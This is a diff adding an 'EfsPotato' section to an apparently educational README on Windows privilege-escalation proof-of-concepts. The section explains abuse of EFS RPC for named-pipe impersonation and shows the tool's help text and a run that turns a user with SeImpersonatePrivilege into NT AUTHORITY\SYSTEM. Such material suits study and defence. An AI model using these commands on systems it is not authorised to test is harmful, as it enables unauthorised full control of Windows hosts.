@@ -8,6 +8,7 @@ This directory is for PoCs to help learning how to get SYSTEM privilege.
   - [Named Pipe Impersonation](#named-pipe-impersonation)
   - [Token Stealing](#token-stealing)
   - [Print Spoofer](#print-spoofer)
+  - [EfsPotato]
   - [Token Duplication with WFP](#token-duplication-with-wfp)
 
 ## Named Pipe Impersonation
@@ -197,6 +198,116 @@ SeCreateSymbolicLinkPrivilege             Create symbolic links                 
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 ```
 
+
+## EfsPotato
+
+This technique is not much different from PrintSpoofer.
+The only difference is that it uses EFS RPC instead of Print Spooler to get the Named Pipe Connection.
+
+* [GitHub - zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+
+Unlike PrintSpoofer, it has been tested on Windows 11 22H2.
+
+```
+PS C:\Dev> .\EfsPotato.exe -h
+
+EfsPotato - PoC to get SYSTEM privileges with EFS RPC method.
+
+Usage: EfsPotato.exe [Options]
+
+        -h, --help        : Displays this help message.
+        -i, --interactive : Flag to execute command with interactive mode.
+        -c, --command     : Specifies command to execute.
+        -s, --session     : Specifies session ID.
+        -t, --timeout     : Specifies timeout in milliseconds. Default is 3,000 ms.
+
+[!] -c option is required.
+```
+
+Usage is same as PrintSpoofer:
+
+```
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name    SID
+============ ==============================================
+dev22h2\user S-1-5-21-3896868301-3921591151-1374190648-1001
+PS C:\Dev> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name         Description                               State
+====================== ========================================= ========
+SeImpersonatePrivilege Impersonate a client after authentication Disabled
+PS C:\Dev> .\EfsPotato.exe -i -c powershell
+
+[>] Trying to create named pipe.
+[+] Named pipe is created successfully.
+    [*] Path : \\.\pipe\{673BDABB-D0D6-403A-9EC8-0AC929BF7C66}\pipe\srvsvc
+[>] Waiting for named pipe connection.
+[>] Calling EfsRpcEncryptFileSrv().
+    [*] Target File Path: \\localhost/pipe/{673BDABB-D0D6-403A-9EC8-0AC929BF7C66}\C$\PrivFu.txt
+[+] Got named pipe connection.
+[+] Named pipe impersonation is successful (SID: S-1-5-18).
+[+] SYSTEM process is executed successfully (PID = 9412).
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+PS C:\Dev> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeCreateTokenPrivilege                    Create a token object                                              Enabled
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeAuditPrivilege                          Generate security audits                                           Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
+SeRelabelPrivilege                        Modify an object label                                             Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+```
+
+![](./figures/EfsPotato.png)
 
 
 ## Token Duplication with WFP
